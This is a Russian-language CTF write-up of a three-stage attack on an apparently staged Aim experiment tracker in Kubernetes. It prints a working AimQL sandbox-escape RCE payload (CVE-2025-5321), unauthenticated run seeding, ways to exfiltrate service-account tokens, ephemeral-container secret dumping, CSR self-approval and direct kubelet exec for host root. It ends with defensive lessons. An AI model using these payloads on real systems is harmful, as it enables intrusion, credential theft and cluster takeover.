## В двух словах (без терминов)

Мишень — сайт, где учёные хранят результаты своих опытов с машинным обучением (такой «электронный журнал экспериментов»). У этого журнала есть известная дыра: в него можно вписать хитрую «формулу фильтра», и сервер, вместо того чтобы просто отфильтровать записи, **выполнит её как команду операционной системы**. То есть чужой сервер начинает слушаться нас.

Одна загвоздка: формула-фильтр срабатывает, только если в журнале уже есть хотя бы одна запись об опыте, а нам подсунули пустой журнал. Значит, сначала надо **самим завести одну запись**. Для этого есть отдельная «служебная дверь» журнала, которую забыли закрыть, но она спрятана не на «стандартном» замке из инструкции, а на другом, «нестандартном». Мы находим её честным перебором и вписываем свою запись.

Дальше мы оказываемся не просто «на сайте», а внутри целого «дата-центра из контейнеров» (Kubernetes). И там у наших ролей выданы **слишком широкие права** — как если бы уборщику дали ключи от всех сейфов «на всякий случай». Пользуясь этими лишними ключами, мы шаг за шагом читаем чужие секреты и в итоге получаем полный контроль над всей машиной. Три флага — за три этапа этого пути.

## 2. Разведка — что мы увидели

### Сначала опознаём, ЧТО перед нами

Прежде чем что-то ломать, полезно понять, из чего мишень сделана — тогда можно искать уже известные слабые места, а не тыкать вслепую. Приметы сложились в один ответ:

- в ответах сервера стоит подпись `server: uvicorn` (это «движок» для Python-сайтов);
- есть путь `/static-files/` и характерные файлы интерфейса на React;
- и главное — сервер отдаёт наружу свою «карту API» (`/openapi.json` — машинно-читаемый список всех адресов и параметров, которые понимает сервер).

Всё вместе однозначно указывает на **Aim** (aimhub.io) — открытую программу-«журнал ML-экспериментов». Раз она открытая, мы скачали её же с официального репозитория пакетов (PyPI) версии **3.29.1** и **побайтово сверили** её карту API с той, что отдаёт мишень — совпало до байта. Значит, мы точно знаем версию и у нас на руках **весь её исходный код**. Это огромное преимущество: можно читать логику мишени как открытую книгу.

> Мини-словарь. **Исходный код** — текст программы, который можно прочитать и понять, как она работает. **API** («эй-пи-ай») — набор «служебных адресов», по которым программы общаются между собой (не страницы для человека, а «команды для машины»). **Карта API** (`openapi.json`) — их официальный каталог.

### Карта того, что торчит наружу

- `:80` (режим `aim up`) — веб-интерфейс и API. Все адреса, которые что-то **записывают**, либо помечены «только чтение» (`@check_read_only` в коде), либо требуют указать уже существующую запись.
- `/api/runs/search/run?q=...` — поиск записей об опытах по «формуле фильтра» (на языке фильтров AimQL). Это и есть кандидат на дыру.
- `/api/projects/activity/` — показывает `num_runs`, то есть **сколько записей** сейчас в журнале.
- `/static-files/{path}` — раздача файлов интерфейса, с правильной защитой от «выхода за пределы папки».
- `/api/reports` — «отчёты», внутри которых можно выполнять Python прямо в браузере посетителя (через Pyodide — «Python, скомпилированный для браузера»).
- **remote-tracking сервер** (`aim server`) — отдельный процесс, единственная «дверь на запись» во всём Aim; по умолчанию слушает порт `:53800`.

> Мини-словарь. **Порт** — «номер двери» на сервере; на одном адресе много дверей с разными номерами. **Запись об опыте** (в Aim её называют **Run**) — одна строчка журнала: «такой-то эксперимент, такие-то числа».

## 3. Как мы дошли до решения (главный раздел)

### Наблюдение → гипотеза: продукт известный и открытый — значит, ищем известную уязвимость, а не фаззим

Раз мы точно опознали Aim 3.29.1 и у нас есть исходник, глупо перебирать параметры наугад. Правильнее — посмотреть, какие **уже описанные** уязвимости есть у этой самой версии. По базе уязвимостей для версии 3.29.1 актуальны:

- **CVE-2025-5321** — «удалённое выполнение кода» (RCE) через побег из песочницы в языке фильтров
  AimQL. Самое ценное. CVE-2024-2195 — предшественник того же класса: GitHub Advisory указывает
  диапазон affected `>=3.0.0, <=3.25.0`, поэтому к нашей версии 3.29.1 она **неприменима**; применима
  именно CVE-2025-5321 (`<=3.29.1`).
- **CVE-2025-51464** — XSS в «Отчётах» (выполнение кода в браузере посетителя).
- **CVE-2025-51463** — запись файла в произвольное место, но добраться до неё можно только через ту самую «дверь на запись».

> Мини-словарь. **CVE** — «паспорт уязвимости»: у каждой публично известной дыры есть номер вида `CVE-2025-5321`, по нему можно прочитать её описание. **RCE** (Remote Code Execution) — «удалённое выполнение кода», святой Грааль атакующего: заставить чужой сервер выполнить твою команду. **Песочница** — попытка запускать чужой код «в загончике», чтобы он не мог трогать систему. **Побег из песочницы** — когда из загончика всё-таки удаётся дотянуться до системы.

Самый сильный вектор — RCE. Копаем его.

### Проверка по исходнику → тупик №1: «RCE есть, а стрелять нечем»

Читаем код построчно. Всплывает неприятная деталь: вредоносная формула-фильтр **вычисляется только во время перебора уже существующих записей об опытах** — внутри цикла «для каждой записи…». А наш свежий экземпляр стартует с `num_runs=0` — **записей ноль** (проверено многократными перезапусками через лончер, с ожиданием далеко за пределами обещанных «~180 секунд на загрузку и наполнение»). Все адреса на порту `:80`, которые могли бы создать запись, либо «только чтение», либо требуют уже существующую запись.

Получается классическая «курица и яйцо»: чтобы формула сработала, нужна хотя бы одна запись; а создать запись через `:80` нельзя. Эксплойт готов — а срабатывать не на чем.

### Тупик №2: XSS в «Отчётах» — есть, но бесполезна

Проверили «Отчёты»/Pyodide как альтернативный способ хоть что-то создать — прогнали настоящим headless-браузером (Chrome без окна, через Playwright). XSS (CVE-2025-51464) подтвердилась вживую: код в отчёте реально исполняется в браузере. Но объект `repo`, доступный внутри отчёта, умеет **только читать** (`fetch_*`-методы) — создать запись им нельзя. И второго пользователя/бота, которого можно было бы «подловить» этой XSS, тут нет. Тупик.

> Мини-словарь. **XSS** — «межсайтовый скриптинг»: атака, когда твой код исполняется в браузере другого посетителя. Работает, только если этот «другой посетитель» есть; на одиночном стенде без ботов она бесполезна.

### Тупик №3 (самый поучительный): «порт `:53800` мёртв» — а на самом деле мёртвой была наша точка обзора

По коду единственный способ создать запись — тот самый remote-tracking сервер (`aim server`), который принимает запись **без пароля**. По умолчанию он на порту `:53800`. Мы стучались туда всеми способами: `curl`, Python-библиотека `requests`, настоящий SDK самого Aim, даже нативный WebSocket из браузера — и **везде тишина**. Первый вывод напрашивался: «порт наружу не проброшен, дверь замурована».

Этот вывод оказался **ошибочным — и ошибка тут поучительна сама по себе**. Все эти «независимые» проверки шли из одной и той же изолированной рабочей среды, у которой выход в интернет был разрешён только на порты 80 и 443. То есть три «разных инструмента» упирались в одно и то же ограничение **нашей собственной сети**, а не в свойство мишени.

> Урок в одну строку: **три инструмента, идущие через одну и ту же точку выхода, — это не тройное подтверждение, а одна и та же ошибка, повторённая трижды.**

Мы это проверили контрольным тестом из обычной сети: заведомо живые публичные сервисы на нестандартных портах оттуда отвечают нормально — значит, исходящий трафик не отфильтрован. Но и с неё дефолтный `:53800` вёл себя ровно как пустой порт: TCP-соединение устанавливается, а ответа нет ни по какому протоколу — так же, как на заведомо мёртвых портах того же хоста. Значит, это не блокировка нашей сети, а балансировщик перед приложением действительно **не пробрасывает наружу дефолтный `:53800`**. Но это ещё не значит, что «дверь на запись» недостижима вообще.

### Решающий шаг: смотреть весь диапазон, а не «стандартный порт из инструкции»

Раз документированный порт закрыт, надо смотреть на **реальную** сетевую топологию, а не на «как положено по инструкции Aim». В Kubernetes сервисы часто выставляют наружу через так называемый **NodePort** — «случайно выбранный номер двери» из специального диапазона `30000–32767` (а не на «родном» порту приложения).

> Мини-словарь. **NodePort** — способ Kubernetes открыть сервис наружу на большом «случайном» номере порта из диапазона 30000–32767, вместо привычного порта приложения. **Балансировщик** (Load Balancer) — «вахтёр» перед сервером, распределяющий входящие соединения.

Мы просканировали **весь** диапазон NodePort — и нашли: тот самый tracking-сервер выставлен наружу на **NodePort `:30800`** (на `/status/` отвечает `{"status": "OK"}`). До него прежние проверки просто не доходили, потому что перебирали лишь «угаданные» кандидаты (53800/8000/8080/43800), а не весь диапазон. Один этот факт — «смотри на весь диапазон NodePort, а не только на документированный порт» — и разблокировал всю цепочку из трёх задач.

**Бытовая аналогия «сердцевины» первого этапа.** Представь музей с известной планировкой из брошюры: «служебный вход — с северной стороны, дверь №53800». Ты приходишь туда — заперто. Вывод «служебного входа нет» неверен: просто в этом конкретном здании дверь перевесили на другую стену. Обойдя всё здание по периметру (полный скан диапазона), находишь ту же служебную дверь под номером №30800 — открытую. А то, что ты «трижды дёргал дверь №53800 и трижды не открылось», ничего не доказывало: ты всё время дёргал не ту дверь, да ещё и в толстых варежках (своя песочница).

### Дальше (task14/15): гипотеза о лишних правах в Kubernetes

Как только у нас есть выполнение команд внутри контейнера, включается стандартная логика: у каждого контейнера в Kubernetes лежит смонтированный «пропуск» (токен служебной учётки) для общения с диспетчером кластера. Значит, можно этим пропуском ходить в «диспетчерскую» и смотреть, **где права выданы шире, чем нужно**. Гипотеза «где-то права избыточны» подтвердилась дважды: учётка `ci-runner` умеет подсаживать в чужие контейнеры «отладочный контейнер», а украденная учётка `cert-manager-sa` умеет сама себе выписывать пропуска (сертификаты). Детали — в §5.

## 4. В чём именно ошибка (суть уязвимости)

Тут не одна дыра, а связка: «побег из песочницы» + «незакрытая дверь на запись» дают RCE, а дальше — типичная цепочка захвата Kubernetes через избыточные права.

### 1. Побег из песочницы RestrictedPython (CVE-2025-5321)

AimQL позволяет фильтровать записи Python-подобным выражением (например, `run.archived == False`), которое исполняется через библиотеку `RestrictedPython`. Эта «песочница» блокирует только имена, **начинающиеся с подчёркивания** `_`. Беда в том, что от любого разрешённого объекта можно обычной цепочкой **публичных** (без подчёркивания) свойств дойти до системных модулей:

```
run.db.runs().session.bind.dialect.dbapi.datetime.sys.modules["os"].system("<команда>")
```

Пошагово: `run.db` — это сессия базы данных → `.dialect.dbapi` — модуль `sqlite3` → внутри него импортирован `datetime` → у него виден `sys` → `sys.modules["os"]` — это модуль `os` → `.system()` выполняет команду ОС. Ни одно звено не начинается с `_`, поэтому чёрный список по подчёркиванию не помогает вовсе.

> Простыми словами: охранник запрещает проносить всё, «что подписано матерным словом». Но нужную вещь можно собрать из деталей, каждая из которых подписана прилично, — и охранник пропускает всё по очереди.

### 2. Незакрытая дверь на запись, доступная снаружи (self-seed через NodePort)

Формула срабатывает только при переборе существующих записей, а единственный способ создать запись — remote-tracking сервер Aim **без авторизации**, случайно выставленный наружу на нестандартном NodePort `:30800`. Это и есть предусловие для п.1: сначала сами создаём себе запись через `aim://<host>:30800`, а уже потом бьём по AimQL.

### 3. Избыточные права в Kubernetes (task14/15)

На этапах 14/15 уязвимость — не в одном месте, а в наборе слишком широких прав у служебных учёток: `ci-runner` может подсаживать «отладочные контейнеры» в любой контейнер раздела; `cert-manager-sa` может **создавать и сам же одобрять** заявки на сертификат. Плюс — сторожевой «webhook» ограничивает только имя в сертификате, но не мешает получить рабочий (пусть и не всесильный) пропуск, которого хватает, чтобы дотянуться до «управляющего агента» ноды и через привилегированный контейнер стать администратором машины.

## 5. Эксплойт по шагам

### task13 — RCE и первый флаг

1. **Заводим себе одну запись** (self-seed) через найденную дверь на NodePort `:30800`:
   ```python
   from aim import Run
   run = Run(repo="aim://<host>:30800", experiment="medoed")
   run["pwn"] = "medoed-was-here"
   run.close()
   ```
   После этого `GET /api/projects/activity/` покажет `num_runs=1` — теперь формула AimQL будет исполняться.

2. **Стреляем AimQL RCE** — гаджет из §4, обёрнутый в командную строку:
   ```
   GET /api/runs/search/run?q=run.db.runs().session.bind.dialect.dbapi.datetime.sys.modules["os"].system("<команда>") or 1&limit=1
   ```
   `limit=1` — важная деталь: без него Aim попробует пройтись по всем записям (при большом их числе единственный рабочий процесс надолго зависает); с `limit=1` формула гарантированно исполнится на первой же записи — стоимость O(1).

3. **Вынос данных (эксфильтрация).** Корневая файловая система контейнера — только для чтения, а раздача `/static-files/{path}` защищена корректно (проверка `os.path.commonpath` не даёт «выйти за пределы папки»). Рабочих схем две:
   - когда папка `aim_ui/build` доступна на запись — RCE копирует нужный файл туда, а мы читаем его обычным `GET /static-files/<случайное-имя>.bin` (режим `exfil` в `exploit.py`);
   - когда файловая система «только чтение» — кладём вывод команды **в параметр записи** через локальный SDK (`Run(repo='/data/repo'); r['out']=...`) и читаем обратно через `GET /api/runs/{id}/info` (`rce_exec.py`).

4. Результат: файл `/flag.txt` (смонтированный секрет `flag1`) в контейнере `webapp`, раздел `brainwash-mlops`, служебная учётка **`ci-runner`** — это **flag1**. Тем же выстрелом забираем «пропуск» `ci-runner` — файл `/var/run/secrets/kubernetes.io/serviceaccount/token`.

### task14 — «зри в корень»: шаг вглубь Kubernetes

Из RCE у нас есть выполнение команд внутри контейнера — значит, есть и стандартный путь «из контейнера в кластер»:

1. Читаем «пропуск» `ci-runner`, имя раздела (`namespace`) и корневой сертификат (`ca.crt`) из папки `/var/run/secrets/kubernetes.io/serviceaccount/` (уже прочитаны в task13).
2. Обращаемся к «диспетчерской» кластера (API-серверу) по внутреннему адресу `https://kubernetes.default.svc` — он доступен только изнутри контейнера, поэтому все запросы идут через тот же RCE-канал, а не с нашей внешней машины.
3. Смотрим права `ci-runner`: выдано `pods get/list` и, важнее, **`pods/ephemeralcontainers patch`** — право подсаживать «отладочный контейнер» в ЛЮБОЙ контейнер раздела. Но при этом НЕТ права `exec`/`logs` (заходить внутрь и читать логи) и НЕТ прямого чтения секретов.

> Мини-словарь. **Pod** («под») — минимальная «коробка» Kubernetes: один или несколько контейнеров, работающих вместе. **Эфемерный (отладочный) контейнер** — временный контейнер, который можно подсадить в уже работающий под, чтобы «зайти и посмотреть». **RBAC** — «список кто-что-может»: система прав в Kubernetes. **`ephemeralcontainers patch`** — право как раз подсаживать такой временный контейнер.

4. Перечисляем все поды (`pod_all.py`) и ищем, где ещё смонтирован секрет с флагом. Находим под **`cert-agent`** (учётка `cert-manager-sa`): у него смонтирован секрет, в имени которого есть `flag`, по пути `/flag.txt`. Но напрямую этот секрет прочитать нельзя — 403 (нет прав).
5. Раз `exec`/`logs` нет, а `ephemeralcontainers patch` есть — используем именно это единственное разрешённое действие. Подсаживаем (`PATCH`) в под `cert-agent` **отладочный контейнер**, который монтирует тот же секрет «только для чтения» и одной командой выгружает его содержимое **не в логи, а в „предсмертную записку" контейнера** (`/dev/termination-log`). Почему туда: «предсмертную записку» контейнера можно прочитать обычным `pods/get` (право, которое у нас уже есть), в отличие от логов, читать которые нам не разрешено.
   ```python
   patch = {"spec": {"ephemeralContainers": [{
       "name": EC,
       "image": "registry.internal.brainwash/base:v1",
       "command": ["sh", "-c", "cat /f/* > /dev/termination-log 2>&1; sleep 2"],
       "volumeMounts": [{"name": VOL, "mountPath": "/f", "readOnly": True}],
       "terminationMessagePolicy": "File",
       "terminationMessagePath": "/dev/termination-log",
       "securityContext": {  # совместимо с политикой безопасности "restricted", иначе патч отклонят
           "allowPrivilegeEscalation": False, "capabilities": {"drop": ["ALL"]},
           "runAsNonRoot": True, "runAsUser": 10001, "seccompProfile": {"type": "RuntimeDefault"},
       },
   }]}}
   ```
   Контейнер отработал и завершился — читаем его «предсмертную записку» `status.ephemeralContainerStatuses[].state.terminated.message` через `GET /api/v1/namespaces/{ns}/pods/{pod}`. Это и есть содержимое секрета.

> Мини-словарь. **Предсмертная записка контейнера** (termination message) — короткий текст, который контейнер оставляет при завершении; штатно её видно через обычный запрос информации о поде.

6. Результат — **flag2** (секрет `flag2`, смонтированный как `/flag.txt` в под `cert-agent`).

### task15 — тотальное доминирование

Тот же приём с отладочным контейнером, но теперь монтируем не секрет-данные, а **собственный „пропуск" пода `cert-agent`** — чтобы украсть токен учётки `cert-manager-sa`:
```python
patch["spec"]["ephemeralContainers"][0]["command"] = ["sh", "-c", "cat /sa/token > /dev/termination-log 2>&1; sleep 2"]
# volumeMounts → монтируем projected-том с источником serviceAccountToken
```

1. **Токен `cert-manager-sa` получен.** Его права: разрешено **создавать и одобрять заявки на сертификат** (CSR) с подписантом `kubernetes.io/kube-apiserver-client` — то есть можно самому себе выписать «клиентский пропуск» для входа в диспетчерскую.

> Мини-словарь. **CSR** (Certificate Signing Request) — «заявка на сертификат»: ты присылаешь свой открытый ключ и просишь подписать его — получаешь именной пропуск. Обычно заявки одобряет администратор; здесь же одна учётка может и подать заявку, и сама её одобрить — как если бы паспорт себе выдавал ты сам.

2. **Первая попытка — сразу в администраторы (`system:masters`).** Делаем заявку с именем `O=system:masters` (`build_csr.py` / `pod_csr.py`) — это классический путь к правам администратора кластера. Но на кластере стоит сторожевой **webhook** (`csr-subject.brainwash.local`), который **принудительно переписывает имя** в одобряемой заявке на `CN=proxyman, O=node-proxymen`. То есть путь в администраторы закрыт не правами, а именно этим сторожем. Это **тупик №4**: очевидная дорога к всевластию перекрыта.

> Мини-словарь. **Admission webhook** — «сторож на входе», проверяющий и при желании переписывающий каждый запрос к кластеру перед тем, как его принять.

3. **Работаем с тем, что дают.** Подаём заявку → сами же (правами `cert-manager-sa`) её одобряем → забираем подписанный сертификат `CN=proxyman, O=node-proxymen` (`pod_mint.py`, ключ на эллиптической кривой — чтобы заявка была компактнее). Права этого нового «пропуска» — только `nodes/proxy get` (доступ к «управляющему агенту» ноды), никакого администраторства. Но и этого достаточно для следующего шага.

> Мини-словарь. **kubelet** — «управляющий агент» на каждой машине-ноде: именно он запускает контейнеры и управляет ими на этой конкретной машине; слушает на порту `:10250`. **`nodes/proxy`** — путь через диспетчерскую, позволяющий поговорить с этим агентом.

4. **Идём к kubelet.** С сертификатом `proxyman` обращаемся к диспетчерской по пути `/api/v1/nodes/{node}/proxy/pods` (`pod_kubelet.py`) — видим список всех подов ноды, в том числе **`kube-system/log-collector`**: он `privileged: true` (привилегированный — почти без ограничений), работает от root (`runAsUser: 0`) и в него **смонтирован весь корень хоста** (`hostPath: /` в `/host`). Это подтвердил `pod_priv.py`, разобрав настройки каждого пода.

> Мини-словарь. **Привилегированный под** — контейнер, которому сняли почти все ограничения безопасности. **hostPath** — монтирование куска файловой системы самой машины-ноды внутрь контейнера; `hostPath: /` означает, что контейнер видит **весь диск хоста**.

5. **Заход в привилегированный под = root на машине.** Ключевая техническая деталь: заход (exec) через путь `nodes/proxy` диспетчерской **обрезает параметры запроса** (теряется сама команда). Поэтому мы бьём WebSocket-заход **не через диспетчерскую, а напрямую в kubelet на `<hostIP>:10250`**, тем же сертификатом `proxyman` (он всё равно авторизован как `nodes/proxy get`, а kubelet проверяет тот же клиентский сертификат) (`pod_exec.py`):
   ```
   GET /exec/kube-system/log-collector-.../collector?command=sh&command=-c&command=<cmd>&output=1&error=1&tty=0
   Upgrade: websocket
   Sec-WebSocket-Protocol: v4.channel.k8s.io
   ```
6. Внутри `log-collector` (root, весь диск хоста виден как `/host`): `cat /host/flag.txt` → **flag3**. Заодно прочитали `/host/etc/rancher/k3s/k3s.yaml` — это «мастер-ключ» от всего кластера (kubeconfig с правами `system:masters`): буквальное тотальное доминирование, а не только флаг.

## 7. Мораль — какой это урок

Эта цепочка — целая коллекция «взрослых» ошибок. Пройдёмся по каждой: что сделали не так, почему так вышло и как надо было.

1. **Чёрные списки в песочницах почти всегда обходятся.** RestrictedPython блокирует по подчёркиванию `_`, но через цепочку публичных свойств от любого объекта можно дойти до `os`. Так вышло из-за заблуждения «достаточно запретить всё „опасно выглядящее"». Как надо: не чёрный список, а строгий **белый список** разрешённого; а ещё лучше — вообще **не исполнять пользовательские выражения** в процессе приложения. Защитнику: любой «язык запросов/фильтров», который где-то `eval`-ится, — красный флаг.

2. **Проверяй свою собственную точку измерения, а не только цель.** Вывод «порт мёртв» был артефактом нашей песочницы (выход только на 80/443). Заблуждение: «раз три разных инструмента показали одно и то же — это точно свойство цели». На деле все три шли через одно узкое место. Как надо: перед выводом «канал недоступен» проверить его контрольным тестом на **заведомо живом** сервисе с той же позиции. Это спасает часы.

3. **Не залипай на «порт по умолчанию».** Настоящая дверь на запись была не на дефолтном `:53800`, а на нестандартном NodePort `:30800` — нашлась только полным сканом диапазона 30000–32767. Инструкция описывает «как обычно», а конкретный кластер может выставить сервис где угодно. Защитнику урок другой: **не выставляй наружу канал записи вообще** (тем более без авторизации) — «нестандартный порт» это не защита.

4. **В Kubernetes даже без `exec`/`logs`/`get secrets` можно прочитать чужой секрет**, если разрешён `ephemeralcontainers patch`. Разработчик рассуждал «мы же не дали читать логи и секреты — значит, безопасно». Но подсаженный контейнер сам сдампит секрет в «предсмертную записку», которую видно обычным `pods/get`. Как надо: **оценивать права по достижимому эффекту, а не по „очевидному" назначению глагола**; `ephemeralcontainers patch` фактически равен `exec` и должен выдаваться так же осторожно.

5. **Право самому подавать и самому одобрять заявки на сертификат — это путь к эскалации.** Сторожевой webhook сузил его (переписал имя), но не закрыл: «ослабленный» сертификат всё равно оказался достаточным трамплином до kubelet → root на ноде → чтение любых файлов, включая мастер-ключ кластера. Как надо: одобрение сертификатов должно быть **отделено** от их запроса (принцип «двух ключей»), а привилегированных подов с `hostPath: /` в кластере вообще быть не должно.

6. **Иногда штатный прокси ломает протокол.** Заход через `nodes/proxy` обрезал параметры запроса — но прямое обращение к kubelet `:10250` тем же пропуском сработало. Урок практику: если «как положено» не работает, попробуй тот же доступ, но напрямую к нижнему сервису.

7. **Дисциплина при сидировании.** Заводи ровно ОДНУ запись; накопление сотен записей роняет `aim up` по памяти. Аккуратность — часть эксплуатации.
